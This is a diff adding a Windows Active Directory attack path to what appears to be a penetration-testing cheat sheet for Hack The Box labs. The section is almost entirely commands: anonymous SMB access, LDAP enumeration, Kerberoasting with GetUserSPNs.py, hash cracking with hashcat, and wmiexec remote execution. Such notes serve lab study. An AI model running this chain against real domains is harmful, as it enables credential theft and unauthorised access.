@@ -1,5 +1,24 @@
 # Web Exploitation
 
+## Windows Attack Path:
+
+# Foothold
+1. smbclient -L //<target>/ -N # SMB anonymous Login
+2. Look for creds
+3. smbmap -H <ip> -u <user> -p <pass> # Map out what the user can access
+4. smbclient //<ip>/<New Share> -U "<user>" # Access new share
+5. Sometimes can get flag from here
+
+# PrivEsc (Kerberoast, 88.)
+1. ldapsearch -x -H ldap://<ip> -D "<user>" -w '<password>' -b "DC=active,DC=htb" # LDAP Search
+1.5 ldapsearch -x -H ldap://<ip> -D "<user>" -w '<password>' -b "DC=active,DC=htb"  -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName # LDAP Search for active accounts
+2. GetADUsers.py -all <domain.htb>/<user> -dc-ip <ip>
+3. ldapsearch -x -H ldap://<ip> -D "<user>" -w '<password>' -b "DC=active,DC=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName # Use to get accounts with SPN. Needed for Kerberoasting
+4. GetUserSPNs.py <domain.htb>/<user> -dc-ip <ip> -request # Request Kerberos Hash
+5. hashcat -m 13100 <hash file> --wordlist rockyou.txt --force --potfile-disable # Crack the hash
+6. wmiexec.py <domain.htb>/<new user>:<cracked hash>@<ip>
+
+
 ## SqlMap
 
 Try to bypass, if possible:
